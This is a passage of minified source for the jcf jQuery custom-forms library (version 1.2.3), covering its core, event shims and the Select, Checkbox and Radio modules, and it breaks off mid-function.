!function(e,t){"use strict";"function"==typeof define&&define.amd?define(["jquery"],t):"object"==typeof exports?module.exports=t(require("jquery")):e.jcf=t(jQuery)}(this,(function(e){"use strict";var t=[],s={optionsKey:"jcf",dataKey:"jcf-instance",rtlClass:"jcf-rtl",focusClass:"jcf-focus",pressedClass:"jcf-pressed",disabledClass:"jcf-disabled",hiddenClass:"jcf-hidden",resetAppearanceClass:"jcf-reset-appearance",unselectableClass:"jcf-unselectable"},i="ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,n=/Windows Phone/.test(navigator.userAgent);s.isMobileDevice=!(!i&&!n);var o=function(){var t=e("<style>").appendTo("head"),i=t.prop("sheet")||t.prop("styleSheet"),n=function(e,t,s){s=s||0,i.insertRule?i.insertRule(e+"{"+t+"}",s):i.addRule(e,t,s)};n("."+s.hiddenClass,"position:absolute !important;left:-9999px !important;height:1px !important;width:1px !important;margin:0 !important;border-width:0 !important;-webkit-appearance:none;-moz-appearance:none;appearance:none"),n("."+s.rtlClass+" ."+s.hiddenClass,"right:-9999px !important; left: auto !important"),n("."+s.unselectableClass,"-webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-tap-highlight-color: rgba(0,0,0,0);"),n("."+s.resetAppearanceClass,"background: none; border: none; -webkit-appearance: none; appearance: none; opacity: 0; filter: alpha(opacity=0);");var o=e("html"),a=e("body");"rtl"!==o.css("direction")&&"rtl"!==a.css("direction")||o.addClass(s.rtlClass),o.on("reset",(function(){setTimeout((function(){r.refreshAll()}),0)})),s.styleSheetCreated=!0};!function(){var t,s=navigator.pointerEnabled||navigator.msPointerEnabled,i="ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch,n={};t=s?{pointerover:navigator.pointerEnabled?"pointerover":"MSPointerOver",pointerdown:navigator.pointerEnabled?"pointerdown":"MSPointerDown",pointermove:navigator.pointerEnabled?"pointermove":"MSPointerMove",pointerup:navigator.pointerEnabled?"pointerup":"MSPointerUp"}:{pointerover:"mouseover",pointerdown:"mousedown"+(i?" touchstart":""),pointermove:"mousemove"+(i?" touchmove":""),pointerup:"mouseup"+(i?" touchend":"")},e.each(t,(function(t,s){e.each(s.split(" "),(function(e,s){n[s]=t}))})),e.each(t,(function(t,s){s=s.split(" "),e.event.special["jcf-"+t]={setup:function(){var t=this;e.each(s,(function(e,s){t.addEventListener?t.addEventListener(s,a,!1):t["on"+s]=a}))},teardown:function(){var t=this;e.each(s,(function(e,s){t.addEventListener?t.removeEventListener(s,a,!1):t["on"+s]=null}))}}}));var o=null,a=function(t){var s=t||window.event,i=null,a=n[s.type];if((t=e.event.fix(s)).type="jcf-"+a,s.pointerType)switch(s.pointerType){case 2:t.pointerType="touch";break;case 3:t.pointerType="pen";break;case 4:t.pointerType="mouse";break;default:t.pointerType=s.pointerType}else t.pointerType=s.type.substr(0,5);return t.pageX||t.pageY||(i=s.changedTouches?s.changedTouches[0]:s,t.pageX=i.pageX,t.pageY=i.pageY),"touchend"===s.type&&(o={x:t.pageX,y:t.pageY}),"mouse"===t.pointerType&&o&&function(e){var t=Math.abs(e.pageX-o.x),s=Math.abs(e.pageY-o.y);if(t<=25&&s<=25)return!0}(t)?void 0:(e.event.dispatch||e.event.handle).call(this,t)}}(),function(){var t=("onwheel"in document||document.documentMode>=9?"wheel":"mousewheel DOMMouseScroll").split(" ");e.event.special["jcf-mousewheel"]={setup:function(){var i=this;e.each(t,(function(e,t){i.addEventListener?i.addEventListener(t,s,!1):i["on"+t]=s}))},teardown:function(){var i=this;e.each(t,(function(e,t){i.addEventListener?i.removeEventListener(t,s,!1):i["on"+t]=null}))}};var s=function(t){var s=t||window.event;return(t=e.event.fix(s)).type="jcf-mousewheel","detail"in s&&(t.deltaY=-s.detail),"wheelDelta"in s&&(t.deltaY=-s.wheelDelta),"wheelDeltaY"in s&&(t.deltaY=-s.wheelDeltaY),"wheelDeltaX"in s&&(t.deltaX=-s.wheelDeltaX),"deltaY"in s&&(t.deltaY=s.deltaY),"deltaX"in s&&(t.deltaX=s.deltaX),t.delta=t.deltaY||t.deltaX,1===s.deltaMode&&(t.delta*=16,t.deltaY*=16,t.deltaX*=16),(e.event.dispatch||e.event.handle).call(this,t)}}();var a={fireNativeEvent:function(t,s){e(t).each((function(){var e,t=this;t.dispatchEvent?((e=document.createEvent("HTMLEvents")).initEvent(s,!0,!0),t.dispatchEvent(e)):document.createEventObject&&((e=document.createEventObject()).target=t,t.fireEvent("on"+s,e))}))},bindHandlers:function(){var t=this;e.each(t,(function(s,i){0===s.indexOf("on")&&e.isFunction(i)&&(t[s]=function(){return i.apply(t,arguments)})}))}},r={version:"1.2.3",modules:{},getOptions:function(){return e.extend({},s)},setOptions:function(t,i){arguments.length>1?this.modules[t]&&e.extend(this.modules[t].prototype.options,i):e.extend(s,t)},addModule:function(i){e.isFunction(i)&&(i=i(e,window));var n=function(i){i.element.data(s.dataKey)||i.element.data(s.dataKey,this),t.push(this),this.options=e.extend({},s,this.options,o(i.element),i),this.bindHandlers(),this.init.apply(this,arguments)},o=function(t){var i=t.data(s.optionsKey),n=t.attr(s.optionsKey);if(i)return i;if(n)try{return e.parseJSON(n)}catch(t){}};n.prototype=i,e.extend(i,a),i.plugins&&e.each(i.plugins,(function(t,s){e.extend(s.prototype,a)}));var r=n.prototype.destroy;n.prototype.destroy=function(){this.options.element.removeData(this.options.dataKey);for(var e=t.length-1;e>=0;e--)if(t[e]===this){t.splice(e,1);break}r&&r.apply(this,arguments)},this.modules[i.name]=n},getInstance:function(t){return e(t).data(s.dataKey)},replace:function(t,i,n){var a,r=this;return s.styleSheetCreated||o(),e(t).each((function(){var t,o=e(this);(a=o.data(s.dataKey))?a.refresh():(i||e.each(r.modules,(function(e,t){if(t.prototype.matchElement.call(t.prototype,o))return i=e,!1})),i&&(t=e.extend({element:o},n),a=new r.modules[i](t)))})),a},refresh:function(t){e(t).each((function(){var t=e(this).data(s.dataKey);t&&t.refresh()}))},destroy:function(t){e(t).each((function(){var t=e(this).data(s.dataKey);t&&t.destroy()}))},replaceAll:function(t){var s=this;e.each(this.modules,(function(i,n){e(n.prototype.selector,t).each((function(){this.className.indexOf("jcf-ignore")<0&&s.replace(this,i)}))}))},refreshAll:function(i){if(i)e.each(this.modules,(function(t,n){e(n.prototype.selector,i).each((function(){var t=e(this).data(s.dataKey);t&&t.refresh()}))}));else for(var n=t.length-1;n>=0;n--)t[n].refresh()},destroyAll:function(i){if(i)e.each(this.modules,(function(t,n){e(n.prototype.selector,i).each((function(t,i){var n=e(i).data(s.dataKey);n&&n.destroy()}))}));else for(;t.length;)t[0].destroy()}};return"function"==typeof define&&define.amd&&(window.jcf=r),r})),function(e){e.addModule((function(t,s){"use strict";function i(e){this.options=t.extend({wrapNative:!0,wrapNativeOnMobile:!0,fakeDropInBody:!0,useCustomScroll:!0,flipDropToFit:!0,maxVisibleItems:10,fakeAreaStructure:'<span class="jcf-select"><span class="jcf-select-text"></span><span class="jcf-select-opener"></span></span>',fakeDropStructure:'<div class="jcf-select-drop"><div class="jcf-select-drop-content"></div></div>',optionClassPrefix:"jcf-option-",selectClassPrefix:"jcf-select-",dropContentSelector:".jcf-select-drop-content",selectTextSelector:".jcf-select-text",dropActiveClass:"jcf-drop-active",flipDropClass:"jcf-drop-flipped"},e),this.init()}function n(e){this.options=t.extend({wrapNative:!0,useCustomScroll:!0,fakeStructure:'<span class="jcf-list-box"><span class="jcf-list-wrapper"></span></span>',selectClassPrefix:"jcf-select-",listHolder:".jcf-list-wrapper"},e),this.init()}function o(e){this.options=t.extend({holder:null,maxVisibleItems:10,selectOnClick:!0,useHoverClass:!1,useCustomScroll:!1,handleResize:!0,multipleSelectWithoutKey:!1,alwaysPreventMouseWheel:!1,indexAttribute:"data-index",cloneClassPrefix:"jcf-option-",containerStructure:'<span class="jcf-list"><span class="jcf-list-content"></span></span>',containerSelector:".jcf-list-content",captionClass:"jcf-optgroup-caption",disabledClass:"jcf-disabled",optionClass:"jcf-option",groupClass:"jcf-optgroup",hoverClass:"jcf-hover",selectedClass:"jcf-selected",scrollClass:"jcf-scroll-active"},e),this.init()}var a={name:"Select",selector:"select",options:{element:null,multipleCompactStyle:!1},plugins:{ListBox:n,ComboBox:i,SelectList:o},matchElement:function(e){return e.is("select")},init:function(){this.element=t(this.options.element),this.createInstance()},isListBox:function(){return this.element.is("[size]:not([jcf-size]), [multiple]")},createInstance:function(){this.instance&&this.instance.destroy(),this.isListBox()&&!this.options.multipleCompactStyle&&this.options.isMobileDevice&&this.options.wrapNativeOnMobile&&(this.options.multipleCompactStyle=!0),this.options.isMobileDevice&&this.options.multipleCompactStyle&&this.options.wrapNativeOnMobile&&!this.element.children("optgroup:first-child").length&&t("<optgroup disabled hidden></optgroup>").prependTo(this.element),this.isListBox()&&!this.options.multipleCompactStyle?this.instance=new n(this.options):this.instance=new i(this.options)},refresh:function(){this.isListBox()&&this.instance instanceof i||!this.isListBox()&&this.instance instanceof n?this.createInstance():this.instance.refresh()},destroy:function(){this.instance.destroy()}};t.extend(i.prototype,{init:function(){this.initStructure(),this.bindHandlers(),this.attachEvents(),this.refresh()},initStructure:function(){this.win=t(s),this.doc=t(document),this.realElement=t(this.options.element),this.fakeElement=t(this.options.fakeAreaStructure).insertAfter(this.realElement),this.selectTextContainer=this.fakeElement.find(this.options.selectTextSelector),this.selectText=t("<span></span>").appendTo(this.selectTextContainer),l(this.fakeElement),this.fakeElement.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),this.realElement.prop("multiple")&&this.fakeElement.addClass("jcf-compact-multiple"),this.options.isMobileDevice&&this.options.wrapNativeOnMobile&&!this.options.wrapNative&&(this.options.wrapNative=!0),this.options.wrapNative?this.realElement.prependTo(this.fakeElement).css({position:"absolute",height:"100%",width:"100%"}).addClass(this.options.resetAppearanceClass):(this.realElement.addClass(this.options.hiddenClass),this.fakeElement.attr("title",this.realElement.attr("title")),this.fakeDropTarget=this.options.fakeDropInBody?t("body"):this.fakeElement)},attachEvents:function(){var e=this;this.delayedRefresh=function(){setTimeout((function(){e.refresh(),e.list&&(e.list.refresh(),e.list.scrollToActiveOption())}),1)},this.options.wrapNative?this.realElement.on({focus:this.onFocus,change:this.onChange,click:this.onChange,keydown:this.delayedRefresh}):(this.realElement.on({focus:this.onFocus,change:this.onChange,keydown:this.onKeyDown}),this.fakeElement.on({"jcf-pointerdown":this.onSelectAreaPress}))},onKeyDown:function(e){13===e.which?this.toggleDropdown():this.dropActive&&this.delayedRefresh()},onChange:function(){this.refresh()},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur),this.toggleListMode(!0),this.focusedFlag=!0)},onBlur:function(){this.pressedFlag||(this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur),this.toggleListMode(!1),this.focusedFlag=!1)},onResize:function(){this.dropActive&&this.hideDropdown()},onSelectDropPress:function(){this.pressedFlag=!0},onSelectDropRelease:function(e,t){this.pressedFlag=!1,"mouse"===t.pointerType&&this.realElement.focus()},onSelectAreaPress:function(e){!this.options.fakeDropInBody&&t(e.target).closest(this.dropdown).length||e.button>1||this.realElement.is(":disabled")||(this.selectOpenedByEvent=e.pointerType,this.toggleDropdown(),this.focusedFlag||("mouse"===e.pointerType?this.realElement.focus():this.onFocus(e)),this.pressedFlag=!0,this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onSelectAreaRelease))},onSelectAreaRelease:function(e){this.focusedFlag&&"mouse"===e.pointerType&&this.realElement.focus(),this.pressedFlag=!1,this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onSelectAreaRelease)},onOutsideClick:function(e){var s=t(e.target);s.closest(this.fakeElement).length||s.closest(this.dropdown).length||this.hideDropdown()},onSelect:function(){this.refresh(),this.realElement.prop("multiple")?this.repositionDropdown():this.hideDropdown(),this.fireNativeEvent(this.realElement,"change")},toggleListMode:function(e){this.options.wrapNative||(e?this.realElement.attr({size:4,"jcf-size":""}):this.options.wrapNative||this.realElement.removeAttr("size jcf-size"))},createDropdown:function(){this.dropdown&&(this.list.destroy(),this.dropdown.remove()),this.dropdown=t(this.options.fakeDropStructure).appendTo(this.fakeDropTarget),this.dropdown.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),l(this.dropdown),this.realElement.prop("multiple")&&this.dropdown.addClass("jcf-compact-multiple"),this.options.fakeDropInBody&&this.dropdown.css({position:"absolute",top:-9999}),this.list=new o({useHoverClass:!0,handleResize:!1,alwaysPreventMouseWheel:!0,maxVisibleItems:this.options.maxVisibleItems,useCustomScroll:this.options.useCustomScroll,holder:this.dropdown.find(this.options.dropContentSelector),multipleSelectWithoutKey:this.realElement.prop("multiple"),element:this.realElement}),t(this.list).on({select:this.onSelect,press:this.onSelectDropPress,release:this.onSelectDropRelease})},repositionDropdown:function(){var e,t,s,i=this.fakeElement.offset(),n=this.fakeElement[0].getBoundingClientRect(),o=n.width||n.right-n.left,a=this.fakeElement.outerHeight(),r=this.dropdown.css("width",o).outerHeight(),l=this.win.scrollTop(),c=this.win.height(),h=!1;i.top+a+r>l+c&&i.top-r>l&&(h=!0),this.options.fakeDropInBody&&(s="static"!==this.fakeDropTarget.css("position")?this.fakeDropTarget.offset().top:0,this.options.flipDropToFit&&h?(t=i.left,e=i.top-r-s):(t=i.left,e=i.top+a-s),this.dropdown.css({width:o,left:t,top:e})),this.dropdown.add(this.fakeElement).toggleClass(this.options.flipDropClass,this.options.flipDropToFit&&h)},showDropdown:function(){this.realElement.prop("options").length&&(this.dropdown||this.createDropdown(),this.dropActive=!0,this.dropdown.appendTo(this.fakeDropTarget),this.fakeElement.addClass(this.options.dropActiveClass),this.refreshSelectedText(),this.repositionDropdown(),this.list.setScrollTop(this.savedScrollTop),this.list.refresh(),this.win.on("resize",this.onResize),this.doc.on("jcf-pointerdown",this.onOutsideClick))},hideDropdown:function(){this.dropdown&&(this.savedScrollTop=this.list.getScrollTop(),this.fakeElement.removeClass(this.options.dropActiveClass+" "+this.options.flipDropClass),this.dropdown.removeClass(this.options.flipDropClass).detach(),this.doc.off("jcf-pointerdown",this.onOutsideClick),this.win.off("resize",this.onResize),this.dropActive=!1,"touch"===this.selectOpenedByEvent&&this.onBlur())},toggleDropdown:function(){this.dropActive?this.hideDropdown():this.showDropdown()},refreshSelectedText:function(){var e,s=this.realElement.prop("selectedIndex"),i=this.realElement.prop("options")[s],n=i?i.getAttribute("data-image"):null,o="";this.realElement.prop("multiple")?(t.each(this.realElement.prop("options"),(function(e,t){t.selected&&(o+=(o?", ":"")+t.innerHTML)})),o||(o=this.realElement.attr("placeholder")||""),this.selectText.removeAttr("class").html(o)):i?this.currentSelectedText===i.innerHTML&&this.currentSelectedImage===n||(e=r(i.className,this.options.optionClassPrefix),this.selectText.attr("class",e).html(i.innerHTML),n?(this.selectImage||(this.selectImage=t("<img>").prependTo(this.selectTextContainer).hide()),this.selectImage.attr("src",n).show()):this.selectImage&&this.selectImage.hide(),this.currentSelectedText=i.innerHTML,this.currentSelectedImage=n):(this.selectImage&&this.selectImage.hide(),this.selectText.removeAttr("class").empty())},refresh:function(){"none"===this.realElement.prop("style").display?this.fakeElement.hide():this.fakeElement.show(),this.refreshSelectedText(),this.fakeElement.toggleClass(this.options.disabledClass,this.realElement.is(":disabled"))},destroy:function(){this.options.wrapNative?this.realElement.insertBefore(this.fakeElement).css({position:"",height:"",width:""}).removeClass(this.options.resetAppearanceClass):(this.realElement.removeClass(this.options.hiddenClass),this.realElement.is("[jcf-size]")&&this.realElement.removeAttr("size jcf-size")),this.fakeElement.remove(),this.doc.off("jcf-pointerup",this.onSelectAreaRelease),this.realElement.off({focus:this.onFocus})}}),t.extend(n.prototype,{init:function(){this.bindHandlers(),this.initStructure(),this.attachEvents()},initStructure:function(){this.realElement=t(this.options.element),this.fakeElement=t(this.options.fakeStructure).insertAfter(this.realElement),this.listHolder=this.fakeElement.find(this.options.listHolder),l(this.fakeElement),this.fakeElement.addClass(r(this.realElement.prop("className"),this.options.selectClassPrefix)),this.realElement.addClass(this.options.hiddenClass),this.list=new o({useCustomScroll:this.options.useCustomScroll,holder:this.listHolder,selectOnClick:!1,element:this.realElement})},attachEvents:function(){var e=this;this.delayedRefresh=function(t){t&&(16===t.which||t.ctrlKey||t.metaKey||t.altKey)||(clearTimeout(e.refreshTimer),e.refreshTimer=setTimeout((function(){e.refresh(),e.list.scrollToActiveOption()}),1))},this.realElement.on({focus:this.onFocus,click:this.delayedRefresh,keydown:this.delayedRefresh}),t(this.list).on({select:this.onSelect,press:this.onFakeOptionsPress,release:this.onFakeOptionsRelease})},onFakeOptionsPress:function(e,t){this.pressedFlag=!0,"mouse"===t.pointerType&&this.realElement.focus()},onFakeOptionsRelease:function(e,t){this.pressedFlag=!1,"mouse"===t.pointerType&&this.realElement.focus()},onSelect:function(){this.fireNativeEvent(this.realElement,"change"),this.fireNativeEvent(this.realElement,"click")},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur),this.focusedFlag=!0)},onBlur:function(){this.pressedFlag||(this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur),this.focusedFlag=!1)},refresh:function(){this.fakeElement.toggleClass(this.options.disabledClass,this.realElement.is(":disabled")),this.list.refresh()},destroy:function(){this.list.destroy(),this.realElement.insertBefore(this.fakeElement).removeClass(this.options.hiddenClass),this.fakeElement.remove()}}),t.extend(o.prototype,{init:function(){this.initStructure(),this.refreshSelectedClass(),this.attachEvents()},initStructure:function(){this.element=t(this.options.element),this.indexSelector="["+this.options.indexAttribute+"]",this.container=t(this.options.containerStructure).appendTo(this.options.holder),this.listHolder=this.container.find(this.options.containerSelector),this.lastClickedIndex=this.element.prop("selectedIndex"),this.rebuildList(),this.element.prop("multiple")&&(this.previousSelection=this.getSelectedOptionsIndexes())},attachEvents:function(){this.bindHandlers(),this.listHolder.on("jcf-pointerdown",this.indexSelector,this.onItemPress),this.listHolder.on("jcf-pointerdown",this.onPress),this.options.useHoverClass&&this.listHolder.on("jcf-pointerover",this.indexSelector,this.onHoverItem)},onPress:function(e){t(this).trigger("press",e),this.listHolder.on("jcf-pointerup",this.onRelease)},onRelease:function(e){t(this).trigger("release",e),this.listHolder.off("jcf-pointerup",this.onRelease)},onHoverItem:function(e){var t=parseFloat(e.currentTarget.getAttribute(this.options.indexAttribute));this.fakeOptions.removeClass(this.options.hoverClass).eq(t).addClass(this.options.hoverClass)},onItemPress:function(e){"touch"===e.pointerType||this.options.selectOnClick?(this.tmpListOffsetTop=this.list.offset().top,this.listHolder.on("jcf-pointerup",this.indexSelector,this.onItemRelease)):this.onSelectItem(e)},onItemRelease:function(e){this.listHolder.off("jcf-pointerup",this.indexSelector,this.onItemRelease),this.tmpListOffsetTop===this.list.offset().top&&this.listHolder.on("click",this.indexSelector,{savedPointerType:e.pointerType},this.onSelectItem),delete this.tmpListOffsetTop},onSelectItem:function(e){var s,i=parseFloat(e.currentTarget.getAttribute(this.options.indexAttribute)),n=e.data&&e.data.savedPointerType||e.pointerType||"mouse";this.listHolder.off("click",this.indexSelector,this.onSelectItem),e.button>1||this.realOptions[i].disabled||(this.element.prop("multiple")?e.metaKey||e.ctrlKey||"touch"===n||this.options.multipleSelectWithoutKey?this.realOptions[i].selected=!this.realOptions[i].selected:e.shiftKey?(s=[this.lastClickedIndex,i].sort((function(e,t){return e-t})),this.realOptions.each((function(e,t){t.selected=e>=s[0]&&e<=s[1]}))):this.element.prop("selectedIndex",i):this.element.prop("selectedIndex",i),e.shiftKey||(this.lastClickedIndex=i),this.refreshSelectedClass(),"mouse"===n&&this.scrollToActiveOption(),t(this).trigger("select"))},rebuildList:function(){var s=this,i=this.element[0];this.storedSelectHTML=i.innerHTML,this.optionIndex=0,this.list=t(this.createOptionsList(i)),this.listHolder.empty().append(this.list),this.realOptions=this.element.find("option"),this.fakeOptions=this.list.find(this.indexSelector),this.fakeListItems=this.list.find("."+this.options.captionClass+","+this.indexSelector),delete this.optionIndex;var n=this.options.maxVisibleItems,o=this.element.prop("size");o>1&&!this.element.is("[jcf-size]")&&(n=o);var a=this.fakeOptions.length>n;this.container.toggleClass(this.options.scrollClass,a),a&&(this.listHolder.css({maxHeight:this.getOverflowHeight(n),overflow:"auto"}),this.options.useCustomScroll&&e.modules.Scrollable)?e.replace(this.listHolder,"Scrollable",{handleResize:this.options.handleResize,alwaysPreventMouseWheel:this.options.alwaysPreventMouseWheel}):this.options.alwaysPreventMouseWheel&&(this.preventWheelHandler=function(e){var t=s.listHolder.scrollTop(),i=s.listHolder.prop("scrollHeight")-s.listHolder.innerHeight();(t<=0&&e.deltaY<0||t>=i&&e.deltaY>0)&&e.preventDefault()},this.listHolder.on("jcf-mousewheel",this.preventWheelHandler))},refreshSelectedClass:function(){var e,t=this,s=this.element.prop("multiple"),i=this.element.prop("selectedIndex");s?this.realOptions.each((function(e,s){t.fakeOptions.eq(e).toggleClass(t.options.selectedClass,!!s.selected)})):(this.fakeOptions.removeClass(this.options.selectedClass+" "+this.options.hoverClass),e=this.fakeOptions.eq(i).addClass(this.options.selectedClass),this.options.useHoverClass&&e.addClass(this.options.hoverClass))},scrollToActiveOption:function(){var e=this.getActiveOptionOffset();"number"==typeof e&&this.listHolder.prop("scrollTop",e)},getSelectedOptionsIndexes:function(){var e=[];return this.realOptions.each((function(t,s){s.selected&&e.push(t)})),e},getChangedSelectedIndex:function(){var e=this.element.prop("selectedIndex"),s=this,i=!1,n=null;return this.element.prop("multiple")?(this.currentSelection=this.getSelectedOptionsIndexes(),t.each(this.currentSelection,(function(e,t){!i&&s.previousSelection.indexOf(t)<0&&(0===e&&(i=!0),n=t)})),this.previousSelection=this.currentSelection,n):e},getActiveOptionOffset:function(){var e=this.getChangedSelectedIndex();if(null!==e){var t=this.listHolder.height(),s=this.listHolder.prop("scrollTop"),i=this.fakeOptions.eq(e),n=i.offset().top-this.list.offset().top,o=i.innerHeight();return n+o>=s+t?n-t+o:n<s?n:void 0}},getOverflowHeight:function(e){var t=this.fakeListItems.eq(e-1),s=this.list.offset().top;return t.offset().top+t.innerHeight()-s},getScrollTop:function(){return this.listHolder.scrollTop()},setScrollTop:function(e){this.listHolder.scrollTop(e)},createOption:function(e){var t=document.createElement("span");t.className=this.options.optionClass,t.innerHTML=e.innerHTML,t.setAttribute(this.options.indexAttribute,this.optionIndex++);var s,i=e.getAttribute("data-image");return i&&((s=document.createElement("img")).src=i,t.insertBefore(s,t.childNodes[0])),e.disabled&&(t.className+=" "+this.options.disabledClass),e.className&&(t.className+=" "+r(e.className,this.options.cloneClassPrefix)),t},createOptGroup:function(e){var t,s,i=document.createElement("span"),n=e.getAttribute("label");return(t=document.createElement("span")).className=this.options.captionClass,t.innerHTML=n,i.appendChild(t),e.children.length&&(s=this.createOptionsList(e),i.appendChild(s)),i.className=this.options.groupClass,i},createOptionContainer:function(){return document.createElement("li")},createOptionsList:function(e){var s=this,i=document.createElement("ul");return t.each(e.children,(function(e,t){var n,o=s.createOptionContainer(t);switch(t.tagName.toLowerCase()){case"option":n=s.createOption(t);break;case"optgroup":n=s.createOptGroup(t)}i.appendChild(o).appendChild(n)})),i},refresh:function(){this.storedSelectHTML!==this.element.prop("innerHTML")&&this.rebuildList();var t=e.getInstance(this.listHolder);t&&t.refresh(),this.refreshSelectedClass()},destroy:function(){this.listHolder.off("jcf-mousewheel",this.preventWheelHandler),this.listHolder.off("jcf-pointerdown",this.indexSelector,this.onSelectItem),this.listHolder.off("jcf-pointerover",this.indexSelector,this.onHoverItem),this.listHolder.off("jcf-pointerdown",this.onPress)}});var r=function(e,t){return e?e.replace(/[\s]*([\S]+)+[\s]*/gi,t+"$1 "):""},l=function(){function t(e){e.preventDefault()}var s=e.getOptions().unselectableClass;return function(e){e.addClass(s).on("selectstart",t)}}();return a}))}(jcf),jcf.addModule((function(e){"use strict";return{name:"Checkbox",selector:'input[type="checkbox"]',options:{wrapNative:!0,checkedClass:"jcf-checked",uncheckedClass:"jcf-unchecked",labelActiveClass:"jcf-label-active",fakeStructure:'<span class="jcf-checkbox"><span></span></span>'},matchElement:function(e){return e.is(":checkbox")},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){this.doc=e(document),this.realElement=e(this.options.element),this.fakeElement=e(this.options.fakeStructure).insertAfter(this.realElement),this.labelElement=this.getLabelFor(),this.options.wrapNative?this.realElement.appendTo(this.fakeElement).css({position:"absolute",height:"100%",width:"100%",opacity:0,margin:0}):this.realElement.addClass(this.options.hiddenClass)},attachEvents:function(){this.realElement.on({focus:this.onFocus,click:this.onRealClick}),this.fakeElement.on("click",this.onFakeClick),this.fakeElement.on("jcf-pointerdown",this.onPress)},onRealClick:function(e){var t=this;this.savedEventObject=e,setTimeout((function(){t.refresh()}),0)},onFakeClick:function(e){this.options.wrapNative&&this.realElement.is(e.target)||this.realElement.is(":disabled")||(delete this.savedEventObject,this.stateChecked=this.realElement.prop("checked"),this.realElement.prop("checked",!this.stateChecked),this.fireNativeEvent(this.realElement,"click"),this.savedEventObject&&this.savedEventObject.isDefaultPrevented()?this.realElement.prop("checked",this.stateChecked):this.fireNativeEvent(this.realElement,"change"),delete this.savedEventObject)},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.focusedFlag=!0,this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur))},onBlur:function(){this.pressedFlag||(this.focusedFlag=!1,this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur))},onPress:function(e){this.focusedFlag||"mouse"!==e.pointerType||this.realElement.focus(),this.pressedFlag=!0,this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onRelease)},onRelease:function(e){this.focusedFlag&&"mouse"===e.pointerType&&this.realElement.focus(),this.pressedFlag=!1,this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onRelease)},getLabelFor:function(){var t=this.realElement.closest("label"),s=this.realElement.prop("id");return!t.length&&s&&(t=e('label[for="'+s+'"]')),t.length?t:null},refresh:function(){var e=this.realElement.is(":checked"),t=this.realElement.is(":disabled");this.fakeElement.toggleClass(this.options.checkedClass,e).toggleClass(this.options.uncheckedClass,!e).toggleClass(this.options.disabledClass,t),this.labelElement&&this.labelElement.toggleClass(this.options.labelActiveClass,e)},destroy:function(){this.options.wrapNative?this.realElement.insertBefore(this.fakeElement).css({position:"",width:"",height:"",opacity:"",margin:""}):this.realElement.removeClass(this.options.hiddenClass),this.fakeElement.off("jcf-pointerdown",this.onPress),this.fakeElement.remove(),this.doc.off("jcf-pointerup",this.onRelease),this.realElement.off({focus:this.onFocus,click:this.onRealClick})}}})),function(e){e.addModule((function(t){"use strict";return{name:"Radio",selector:'input[type="radio"]',options:{wrapNative:!0,checkedClass:"jcf-checked",uncheckedClass:"jcf-unchecked",labelActiveClass:"jcf-label-active",fakeStructure:'<span class="jcf-radio"><span></span></span>'},matchElement:function(e){return e.is(":radio")},init:function(){this.initStructure(),this.attachEvents(),this.refresh()},initStructure:function(){this.doc=t(document),this.realElement=t(this.options.element),this.fakeElement=t(this.options.fakeStructure).insertAfter(this.realElement),this.labelElement=this.getLabelFor(),this.options.wrapNative?this.realElement.prependTo(this.fakeElement).css({position:"absolute",opacity:0}):this.realElement.addClass(this.options.hiddenClass)},attachEvents:function(){this.realElement.on({focus:this.onFocus,click:this.onRealClick}),this.fakeElement.on("click",this.onFakeClick),this.fakeElement.on("jcf-pointerdown",this.onPress)},onRealClick:function(e){var t=this;this.savedEventObject=e,setTimeout((function(){t.refreshRadioGroup()}),0)},onFakeClick:function(e){this.options.wrapNative&&this.realElement.is(e.target)||this.realElement.is(":disabled")||(delete this.savedEventObject,this.currentActiveRadio=this.getCurrentActiveRadio(),this.stateChecked=this.realElement.prop("checked"),this.realElement.prop("checked",!0),this.fireNativeEvent(this.realElement,"click"),this.savedEventObject&&this.savedEventObject.isDefaultPrevented()?(this.realElement.prop("checked",this.stateChecked),this.currentActiveRadio.prop("checked",!0)):this.fireNativeEvent(this.realElement,"change"),delete this.savedEventObject)},onFocus:function(){this.pressedFlag&&this.focusedFlag||(this.focusedFlag=!0,this.fakeElement.addClass(this.options.focusClass),this.realElement.on("blur",this.onBlur))},onBlur:function(){this.pressedFlag||(this.focusedFlag=!1,this.fakeElement.removeClass(this.options.focusClass),this.realElement.off("blur",this.onBlur))},onPress:function(e){this.focusedFlag||"mouse"!==e.pointerType||this.realElement.focus(),this.pressedFlag=!0,this.fakeElement.addClass(this.options.pressedClass),this.doc.on("jcf-pointerup",this.onRelease)},onRelease:function(e){this.focusedFlag&&"mouse"===e.pointerType&&this.realElement.focus(),this.pressedFlag=!1,this.fakeElement.removeClass(this.options.pressedClass),this.doc.off("jcf-pointerup",this.onRelease)},getCurrentActiveRadio:function(){return this.getRadioGroup(this.realElement).filter(":checked")},getRadioGroup:function(e){var s=e.attr("name"),i=e.parents("form");return s?i.length?i.find('input[name="'+s+'"]'):t('input[name="'+s+'"]:not(form input)'):e},getLabelFor:function(){var e=this.realElement.closest("label"),s=this.realElement.prop("id");return!e.length&&s&&(e=t('label[for="'+s+'"]')),e.length?e:null},refreshRadioGroup:function(){this.getRadioGroup(this.realElement).each((function(){e.refresh(this)}))},refresh:function(){var 